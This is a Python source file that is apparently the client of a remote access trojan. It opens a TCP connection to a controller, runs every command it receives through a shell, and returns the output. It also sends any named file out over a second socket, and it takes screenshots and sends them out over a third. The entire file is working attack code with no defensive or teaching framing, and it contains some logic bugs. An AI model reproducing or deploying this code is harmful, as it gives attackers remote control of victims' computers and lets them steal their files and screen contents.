print('client')
import socket
import subprocess
import random as r
from datetime import datetime
import os
import time
try:
    from pywhatkit import take_screenshot as shot
except:
    print("check your Network Connection . . .This Is For Screen Shot")
    pass    

s=socket.socket(socket.AF_INET,
                socket.SOCK_STREAM)# TCP socket
host='127.0.0.1'
port=443
s.connect((host, port))
print('x')
sep="<sep>"
cwd=os.getcwd()
s.send(cwd.encode())
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
while True:
    
    cmd=s.recv(1024*128)
    msg=cmd.decode("utf-8")
    if msg.lower()=="cls"or"clear":
        try:
            os.system('cls')
        except:
            os.system('clear')
    if msg.lower()=="exit":
        break
    splited=msg.split()
    if splited[0].lower()=="cd":
        try:
            os.chdir(' '.join(splited[1:]))
        except FileNotFoundError as e:
           out=str(e)
        else:
            output=""

    command=subprocess.getoutput(msg)
    cwd=os.getcwd()
    message=f'{command}{sep}{cwd}'
    s.send(message.encode("utf-8"))

###Download Files client # # # # # # # # # # # # # # # # # # # 
    
    def download():
        
        file = splited[1]
        file = open(file , mode = "rb")
        data = file.read()
        file.close()
        ip='127.0.0.1'
        port = 5521

        sock = socket.socket(socket.AF_INET ,
                             socket.SOCK_STREAM)### New Socket For Download Files

        sock.connect((ip , port))

        # Connected
        try:
            
            while True:
                if len(data) > 0:
                    tmp_data = data[0:1024]
                    if len(tmp_data) < 1024:
                        tmp_data += chr(0).encode() * (1024 - len(tmp_data))
                    data = data[1024:]
                    
                    sock.send(tmp_data)
                    print("." , end="")
                else:
                    sock.send(b"endendend")
                    print("done")
                    sock.close()
                    break
        except:
            out=""
                    
    # # # # # # # # # # # # # # # # # # # # # # # # # # # #
    ### Screen Shot . . . 

    def screen():
        
        try:
            name=str(r.randint(1,1000))### Screen
            screen=shot(name+'.img')   ###  SHOT
            print("[*]Screen Shot Taked")
            
            ip='127.0.0.1'
            port=5858
            sc=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sc.connect((ip, port))
            
            file=(screen)
            file = open(file , mode = "rb")
            data = file.read()
            file.close()
            
            while True:
                if len(data) > 0:
                    tmp_data = data[0:1024]
                    if len(tmp_data) < 1024:
                        tmp_data += chr(0).encode() * (1024 - len(tmp_data))
                    data = data[1024:]
                    
                    sc.send(tmp_data)
                    print("." , end="")
                else:
                    sc.send(b"endendend")
                    print("done")
                    sc.close()
        except:
            out=""
    if splited[0]=="download".lower():
        download()
        pass
    if splited[0]=="screen".lower():
        screen()
        pass
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
    
    
            
        
    